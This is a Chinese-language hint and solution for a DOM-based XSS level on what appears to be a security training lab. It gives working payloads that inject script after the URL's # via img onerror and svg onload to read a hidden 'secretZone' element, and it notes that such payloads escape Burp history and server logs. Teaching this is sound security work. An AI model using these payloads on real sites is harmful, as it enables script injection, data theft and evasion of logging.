思路提示

DOM 型 XSS 的核心是整个过程都在浏览器里完成，不经过服务器。本关把 URL 中 # 后面的内容直接写入 innerHTML。思路：在 URL 的 # 后面构造能执行 JS 的标签（如 <img onerror>、<svg onload>）。注意 payload 在 # 后面，浏览器不会发给服务器，所以 Burp 的 HTTP history 里看不到。要显示隐藏的通关凭证，可以用 JS 读取通关凭证元素的内容。

详细解题过程（点击展开）
方法1 - 直接在地址栏追加 Hash：
/modules/xss/dom.php#<img src=x onerror=alert(1)>
方法2 - 用页面上的输入框写入（会自动编码后放进 # 后面）。
显示隐藏的通关凭证（本关目标）：
#<svg onload="document.getElementById('domOut').innerHTML=document.getElementById('secretZone').textContent">
或直接弹窗取出：
#<img src=x onerror=alert(document.getElementById('secretZone').textContent)>
与反射型的关键区别：payload 在 # 后面，浏览器不会把它发给服务器，所以 Burp Proxy 的 HTTP history 里看不到，服务端日志也没有记录。
